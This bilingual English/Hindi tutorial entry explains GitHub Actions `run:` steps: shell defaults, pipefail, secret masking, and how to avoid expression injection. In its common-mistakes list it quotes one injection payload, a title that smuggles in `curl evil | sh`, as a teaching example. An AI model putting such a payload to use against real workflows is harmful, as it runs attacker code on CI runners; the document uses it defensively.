# 255. run: (Shell command)
# हिंदी में: run: (Shell command चलाना)

---

## 🔵 Simple Definition (English)
`run:` executes command-line programs in a step using the runner's shell (bash on Linux/macOS, PowerShell on Windows by default). It accepts single-line or multi-line (`|`) scripts. You can choose another shell with `shell:` (`bash`, `sh`, `pwsh`, `python`, `cmd`, custom template) and a folder with `working-directory:`.

## 🔵 सरल परिभाषा (Hindi)
`run:` step में runner की shell (Linux/macOS पर bash, Windows पर default PowerShell) से command-line programs चलाता है। यह एक-पंक्ति या बहु-पंक्ति (`|`) scripts लेता है। `shell:` से दूसरी shell (`bash`, `sh`, `pwsh`, `python`, `cmd`, custom template) और `working-directory:` से folder चुन सकते हैं।

---

## 🔴 Problem it Solves
Actions cover common tasks, but your project has unique commands: `npm run lint`, `alembic upgrade head`, `docker compose up`, `ssh deploy@server`, `curl` smoke tests. `run:` lets you use any CLI tool installed on the runner. The danger: scripts are easy to write unsafely (unquoted variables, secrets echoed, expression injection), so understanding shell flags and quoting matters.

## 🔴 यह क्यों बना? (Hindi)
Actions आम कामों को कवर करते हैं, पर आपके project में अपने commands होते हैं: `npm run lint`, `alembic upgrade head`, `docker compose up`, `ssh deploy@server`, `curl` smoke tests। `run:` runner पर installed किसी भी CLI tool को चलाने देता है। खतरा: scripts असुरक्षित तरीके से लिखना आसान है (बिना quote के variables, secrets echo होना, expression injection), इसलिए shell flags और quoting समझना ज़रूरी है।

---

## 🟢 How it Works — Step by Step

```
Step 1 → GitHub expands ${{ ... }} expressions in the run text BEFORE the shell sees it (template substitution).
Step 2 → The resulting text is saved to a temp script file (e.g., /home/runner/work/_temp/xxxx.sh).
Step 3 → Runner executes it: default for bash is `bash --noprofile --norc -eo pipefail {0}` when shell: bash is set explicitly;
         when shell is omitted on Linux, it is `bash -e {0}` (no pipefail!).
Step 4 → Output goes to the log; secrets values are auto-masked as ***.
Step 5 → Exit code 0 = success; any non-zero = step fails.
Step 6 → Special files: $GITHUB_OUTPUT, $GITHUB_ENV, $GITHUB_PATH, $GITHUB_STEP_SUMMARY.
Step 7 → Each `run` step is a new process: cd, export, and shell variables do not carry over.
```

## 🟢 कैसे काम करता है? (Hindi)

```
Step 1 → Shell देखे उससे पहले GitHub run text में ${{ ... }} expressions बदल देता है (template substitution)।
Step 2 → नतीजा text temp script file (जैसे /home/runner/work/_temp/xxxx.sh) में सहेजा जाता है।
Step 3 → Runner उसे चलाता है: shell: bash स्पष्ट लिखने पर `bash --noprofile --norc -eo pipefail {0}`;
         shell न लिखें तो Linux पर `bash -e {0}` (pipefail नहीं!)।
Step 4 → Output log में जाता है; secrets अपने-आप *** से mask होते हैं।
Step 5 → Exit code 0 = सफल; कोई भी non-zero = step fail।
Step 6 → विशेष files: $GITHUB_OUTPUT, $GITHUB_ENV, $GITHUB_PATH, $GITHUB_STEP_SUMMARY।
Step 7 → हर `run` step नई process है: cd, export और shell variables आगे नहीं जाते।
```

Shell options: `bash`, `sh`, `pwsh`, `powershell`, `cmd`, `python`; custom: `shell: bash -x {0}` (the `{0}` is the script file).

---

## 🟡 Real World Example
A deployment step SSHes into a VPS and runs `docker compose pull && docker compose up -d`. Initially it was written as `run: ssh ... | tee deploy.log`; when `ssh` failed the pipe still returned tee's success, so the pipeline went green while the site was stale. Switching to `shell: bash` (which adds `pipefail`) made the step fail properly. Another team found a `run: echo "Title: ${{ github.event.pull_request.title }}"` that let a PR title run commands; they moved it to `env:`.

## 🟡 Real Example Hindi mein
Deployment step VPS पर SSH करके `docker compose pull && docker compose up -d` चलाता है। शुरू में `run: ssh ... | tee deploy.log` लिखा था; `ssh` fail होने पर भी pipe tee का success लौटाता था, इसलिए pipeline green रहा पर site पुरानी थी। `shell: bash` (जो `pipefail` जोड़ता है) लगाने से step सही तरह fail होने लगा। एक और team को `run: echo "Title: ${{ github.event.pull_request.title }}"` मिला जिससे PR title commands चला सकता था; उन्होंने उसे `env:` में बदला।

---

## 💻 Code / Config Example — Basic

```yaml
# .github/workflows/run-basic.yml
name: Run Basic                           # workflow name
on: [push]                                # trigger

jobs:
  demo:                                   # job id
    runs-on: ubuntu-latest                # Linux runner
    steps:
      - uses: actions/checkout@v4         # get code
      - run: echo "single line command"   # single-line run
      - name: Multi-line script           # label in the log
        run: |                            # '|' keeps newlines: each line is a command
          echo "line 1"                   # first command
          date                            # second command
          ls -la                          # third command
      - name: Folded string               # '>' folds lines into ONE command
        run: >
          echo
          "this is one long command"
```

## 💻 Code / Config Example — Advanced

```yaml
# .github/workflows/run-advanced.yml
name: Run Advanced
on:
  pull_request:
    branches: [main]

jobs:
  scripts:
    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash                       # explicit bash => -eo pipefail enabled
    steps:
      - uses: actions/checkout@v4

      - name: Safe use of untrusted values
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}   # attacker-controlled text goes through env
          BRANCH: ${{ github.head_ref }}                      # also attacker-controlled
        run: |
          echo "Title: $PR_TITLE"         # quoted shell variable, not a template: no injection
          echo "Branch: $BRANCH"

      - name: Strict script
        run: |
          set -euo pipefail               # -e stop on error, -u fail on unset var, pipefail for pipes
          IFS=$'\n\t'                     # safer word splitting
          files=$(git ls-files '*.sh' | wc -l)   # command substitution
          echo "shell scripts: $files"
          if [ "$files" -gt 0 ]; then
            git ls-files '*.sh' | xargs -r bash -n   # syntax-check every shell script
          fi

      - name: Write summary to the run page
        run: |
          {
            echo "### Build summary"                    # markdown heading
            echo "- commit: \`${GITHUB_SHA::7}\`"       # short SHA (bash substring expansion)
            echo "- actor: $GITHUB_ACTOR"
          } >> "$GITHUB_STEP_SUMMARY"                   # appears in the Actions UI

      - name: Python as shell
        shell: python                     # script is run by python
        run: |
          import sys, platform
          print("python", sys.version.split()[0], platform.system())

      - name: Mask a dynamic value
        run: |
          token=$(date +%s | sha256sum | cut -c1-16)     # pretend this is a generated token
          echo "::add-mask::$token"                      # hide it in all later logs
          echo "TOKEN=$token" >> "$GITHUB_ENV"           # make it available to next steps (masked)

      - name: Retry flaky network command
        run: |
          for i in 1 2 3; do                              # try up to 3 times
            curl --fail --silent --max-time 10 https://example.com && break   # stop on success
            echo "retry $i"; sleep 5                      # wait then retry
          done
```

(YAML parsed locally; shell blocks syntax-checked with `bash -n` in scratch. Not executed on GitHub.)

---

## 🟠 My Stack Integration
- **Node.js:** `run: npm ci`, `npm run build`, `npm audit`.
- **FastAPI:** `run: pip install -r requirements.txt && pytest`, `alembic upgrade head` on the VPS.
- **React:** `run: npm run build` with `CI=true` (CRA treats warnings as errors).
- **Nginx / VPS / AWS:** `ssh`, `rsync`, `docker compose`, `aws ecs update-service`, `nginx -t` before reload.

```yaml
# Safe Nginx config deploy step: test before reload so a bad config never takes the site down
- name: Deploy and reload Nginx
  env:
    HOST: ${{ secrets.VPS_HOST }}
    KEY: ${{ secrets.VPS_SSH_KEY }}
  run: |
    set -euo pipefail
    install -m 600 /dev/null key && printf '%s\n' "$KEY" > key        # key file with strict permission
    scp -i key -o StrictHostKeyChecking=accept-new nginx/app.conf "deploy@$HOST:/tmp/app.conf"  # upload candidate config
    ssh -i key "deploy@$HOST" 'sudo cp /tmp/app.conf /etc/nginx/conf.d/app.conf && sudo nginx -t && sudo systemctl reload nginx'
```

---

## ⚠️ Common Mistakes to Avoid
❌ Mistake 1: `run: echo "${{ github.event.issue.title }}"` - expression injection (title `"; curl evil | sh; "`).
✅ Correct: Put it in `env:` and use `"$VAR"`.

❌ Mistake 2: Relying on pipes without `pipefail` (default Linux shell omits it).
✅ Correct: Set `shell: bash` or `set -o pipefail`.

❌ Mistake 3: `echo $SECRET` or `set -x` with secrets - masking is not perfect (base64/transformed values leak).
✅ Correct: Never print secrets; avoid `set -x` in steps with secrets.

❌ Mistake 4: Windows backslashes/PowerShell differences in a cross-OS matrix.
✅ Correct: Set `shell: bash` for consistent behavior (Git Bash exists on Windows runners).

❌ Mistake 5: Unquoted variables (`rm -rf $DIR/`) which can expand into disasters.
✅ Correct: Always quote and use `${VAR:?}` for required values.

---

## 🧠 Tricky Interview Question
`run: cat missing.txt | tee out.txt` where `missing.txt` does not exist. The step is green. Why?

Answer: Without `pipefail`, a pipeline's exit status is that of the LAST command (`tee`), which succeeds, so the failure of `cat` is hidden. The default Linux shell when `shell:` is omitted is `bash -e {0}` (no pipefail). Setting `shell: bash` (which runs `bash --noprofile --norc -eo pipefail {0}`) or `set -o pipefail` makes any failing stage fail the pipeline.

---

## ⚫ Interview Questions + Answers

Q1: What is the default shell?
A1: bash on Linux/macOS (as `bash -e {0}` when unspecified) and PowerShell Core on Windows (`pwsh`, falling back to `powershell`).

Q2: How do you run multiple commands?
A2: Use `run: |` multi-line block; each line is a command in the same shell process.

Q3: `|` vs `>` in YAML?
A3: `|` keeps newlines (script); `>` folds newlines to spaces (one long line).

Q4: How do you pass a variable to later steps?
A4: Append `NAME=value` to `$GITHUB_ENV` (environment) or `name=value` to `$GITHUB_OUTPUT` (step output).

Q5: How do you prevent script injection?
A5: Never interpolate untrusted `${{ }}` data into `run:`; use `env:` and shell variables; or use an action with `with:` inputs.

---

## 🔷 When to Use + When Not to Use
✅ Use when:
- Running project-specific commands, scripts, CLI tools.
- Glue code between actions.

❌ Avoid when:
- A trusted, well-maintained action already does it better (e.g. cache handling).
- Scripts become 50+ lines: move to a versioned script file `scripts/ci.sh` and call it.

---

## 📊 Visual Diagram

```
 workflow text:  run: echo "Hi ${{ github.actor }}"
        │
        ▼ 1. GitHub substitutes expressions (template)
 script text:    echo "Hi addyrj"
        │
        ▼ 2. written to _temp/abc.sh
        ▼ 3. bash -e abc.sh   (or -eo pipefail with shell: bash)
        │
        ├── stdout/stderr ─► log (secrets masked ***)
        ├── >> $GITHUB_ENV / $GITHUB_OUTPUT ─► later steps
        └── exit code ─► 0 = ✔ step passes | non-zero = ✘ step fails
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| run | Execute shell commands | Shell commands चलाना |
| shell | Interpreter (bash, pwsh, python) | Interpreter |
| pipefail | Fail if any pipe stage fails | Pipe का कोई चरण fail तो fail |
| exit code | Number returned by a command | Command का लौटाया अंक |
| expression injection | Untrusted input inside `${{ }}` run | `${{ }}` में अविश्वसनीय input |
| GITHUB_STEP_SUMMARY | Markdown shown on run page | Run page का markdown |

---

## ⚡ 3-Line Summary
English: `run:` executes shell commands; each step is a fresh shell with a non-zero exit meaning failure.
English: Use `shell: bash` for `pipefail`, `set -euo pipefail` for strict scripts.
English: Pass untrusted values through `env:`, never inline.
Hindi: `run:` shell commands चलाता है; हर step नई shell है और non-zero exit का मतलब failure।
Hindi: `pipefail` के लिए `shell: bash` और strict scripts के लिए `set -euo pipefail` लें।
Hindi: अविश्वसनीय values `env:` से दें, सीधे inline नहीं।

---

## ➡️ Next Topic
**256. name: Field** - give workflows, jobs and steps readable names that show up in logs and required checks.
